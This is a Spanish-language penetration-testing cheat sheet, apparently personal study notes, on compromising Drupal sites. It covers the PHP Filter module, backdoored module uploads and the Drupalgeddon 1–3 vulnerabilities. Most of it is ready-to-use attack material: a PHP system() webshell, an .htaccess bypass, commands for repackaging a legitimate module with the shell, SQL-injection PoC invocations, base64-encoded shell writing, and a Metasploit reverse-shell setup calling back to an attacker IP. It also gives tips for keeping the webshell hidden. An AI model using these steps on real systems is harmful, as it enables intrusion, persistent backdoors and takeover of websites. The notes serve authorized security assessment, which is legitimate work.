---
tags:
  - drupal
  - webapp
  - attack
---
## Conceptos Clave (TL;DR)
* A diferencia de otros CMS, obtener una shell desde la consola de administración de Drupal no es tan simple como editar un archivo PHP de un tema.
* **PHP Filter Module:** En versiones antiguas (pre-8), permite habilitar la ejecución de código PHP embebido directamente desde la interfaz web. A partir de la versión 8, debe instalarse manualmente.
* **Módulos Backdoorizados:** Los administradores pueden subir módulos. Se puede interceptar un módulo legítimo (ej. CAPTCHA), insertar una webshell y un `.htaccess` para evadir restricciones de acceso al directorio, y subirlo.
* **Drupalgeddon (1, 2 y 3):** Vulnerabilidades críticas históricas de ejecución de código y SQLi en el core de Drupal.
  * **Drupalgeddon 1 (CVE-2014-3704):** SQLi pre-autenticado para crear usuarios administradores.
  * **Drupalgeddon 2 (CVE-2018-7600):** RCE no autenticado por mala sanitización en el registro de usuarios.
  * **Drupalgeddon 3 (CVE-2018-7602):** RCE autenticado que explota la API de formularios.

## Herramientas Clave
* **PHP Filter Module:** Módulo oficial de Drupal abusado para lograr RCE.
* **Python PoC Scripts:** `drupalgeddon.py` (creación de admin) y `drupalgeddon2.py` (ejecución de comandos y subida de archivos).
* **Metasploit:** Módulos `exploit/multi/http/drupal_drupageddon` y `exploit/multi/http/drupal_drupageddon3`.
* **cURL / wget / tar:** Herramientas nativas para descargar, empaquetar y triggerear webshells.

## Metodología Paso a Paso

### Fase 1: Abuso de Funcionalidades Administrativas (PHP Filter)
1. **Pre-Drupal 8:** Autenticarse como administrador, ir a la página de módulos e habilitar el módulo "PHP filter".
2. **Post-Drupal 8:** Descargar el módulo desde `drupal.org`. Ir a Administration > Reports > Available updates (o menú Extend) e instalar el módulo subiendo el archivo.
3. Ir a Content > Add content > Basic page.
4. En el cuerpo, insertar el payload PHP malicioso y asegurarse de cambiar el formato de texto (Text format) a "PHP code".
5. Guardar e interactuar con la shell mediante peticiones GET en la URL creada.

### Fase 2: Módulos Backdoorizados
1. Descargar un módulo legítimo (ej. CAPTCHA) desde el sitio oficial de Drupal y extraerlo.
2. Crear un archivo PHP malicioso (`shell.php`) dentro del directorio del módulo.
3. Crear un archivo `.htaccess` en el mismo directorio. Esto es crítico porque Drupal bloquea el acceso directo a la carpeta `/modules`.
4. Empaquetar el directorio modificado en un archivo `.tar.gz`.
5. En Drupal, ir a Manage > Extend > + Install new module y subir el archivo.
6. Triggerear la webshell navegando a `/modules/<MODULE_NAME>/shell.php`.

### Fase 3: Explotación de Vulnerabilidades Conocidas
1. **Drupalgeddon 1:** Usar un script PoC en Python para inyectar un nuevo usuario administrador. Luego, iniciar sesión y proceder con la Fase 1.
2. **Drupalgeddon 2:** Usar el script PoC para verificar RCE subiendo un archivo de prueba (ej. `hello.txt`). Luego, usar comandos en base64 para escribir una webshell permanente y triggerearla.
3. **Drupalgeddon 3:** Requiere credenciales y un nodo que pueda ser eliminado. Interceptar la cookie de sesión (`SESS...`) e inyectarla en el módulo de Metasploit correspondiente para obtener una reverse shell.

## Cheat Sheet de Comandos

### Webshell PHP Recomendada
Se usa un hash MD5 como parámetro para evitar dejar un backdoor evidente a otros atacantes (drive-by attackers) o scripts de fuerza bruta.
```php
<?php
system($_GET['<MD5_HASH_AQUI>']);
?>
```

### Bypass de .htaccess para Módulos Backdoorizados
```apache
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

### Gestión de Módulos Backdoorizados (Terminal)
```bash
# Descargar un modulo y extraerlo
wget --no-check-certificate [https://ftp.drupal.org/files/projects/](https://ftp.drupal.org/files/projects/)<MODULE_NAME>-<VERSION>.tar.gz
tar xvf <MODULE_NAME>-<VERSION>.tar.gz

# Mover la webshell y el htaccess al modulo y reempaquetarlo
mv shell.php .htaccess <MODULE_NAME>
tar cvf <MODULE_NAME>_backdoor.tar.gz <MODULE_NAME>/

# Triggerear comando
curl -s http://<TARGET_URL>/modules/<MODULE_NAME>/shell.php?<MD5_HASH_AQUI>=id
```

### Drupalgeddon 1 (CVE-2014-3704)
```bash
# Crear un usuario administrador mediante SQLi
python2.7 drupalgeddon.py -t http://<TARGET_URL> -u <NEW_USER> -p <NEW_PASSWORD>
```

### Drupalgeddon 2 (CVE-2018-7600)
```bash
# Verificar vulnerabilidad (script pedira URL y dejara un archivo hello.txt)
python3 drupalgeddon2.py

# Preparar una webshell ofuscada en Base64 localmente
echo '<?php system($_GET["<MD5_HASH_AQUI>"]);?>' | base64

# Explotar la vulnerabilidad para escribir el archivo malicioso usando la salida en Base64
# (Insertar este payload cuando el script PoC pregunte por el comando a ejecutar)
echo "<BASE64_STRING>" | base64 -d | tee <SHELL_NAME>.php

# Triggerear la shell
curl http://<TARGET_URL>/<SHELL_NAME>.php?<MD5_HASH_AQUI>=id
```

### Drupalgeddon 3 (CVE-2018-7602) - Metasploit
```bash
# Configurar y lanzar exploit en Metasploit
use exploit/multi/http/drupal_drupageddon3
set RHOSTS <TARGET_IP>
set VHOST <TARGET_DOMAIN>
# Insertar la cookie completa obtenida de la sesion interceptada
set DRUPAL_SESSION <COOKIE_NAME>=<COOKIE_VALUE> 
set DRUPAL_NODE 1
set LHOST <ATTACKER_IP>
set LPORT <ATTACKER_PORT>
exploit
```

## "Gotchas" y Troubleshooting
* **Parámetros GET Seguros:** Nunca uses `?cmd=`. Usa un hash MD5 impredecible (ej. `?dcfdd5e021a869fcc6dfaef8bf31377e=`) para evitar que terceros encuentren y usen tu webshell.
* **Bypass de Directorios:** Drupal prohíbe de forma nativa la ejecución directa de scripts en el directorio `/modules`. Si subes un módulo sin un archivo `.htaccess` configurado para reescribir reglas, obtendrás un error 403 Forbidden.
* **Limpieza Obligatoria:** Si instalas el módulo PHP Filter o subes un módulo malicioso, es imperativo eliminar o deshabilitar el módulo y borrar las páginas creadas una vez finalizado el assessment.
* **Formato de Texto en Páginas:** Si usas el módulo PHP Filter, el código no se ejecutará a menos que selecciones explícitamente "PHP code" en el menú desplegable "Text format" al crear la página.
* **Drupalgeddon 3:** Este exploit asume que el usuario comprometido tiene permisos para eliminar (delete) un nodo existente en el CMS.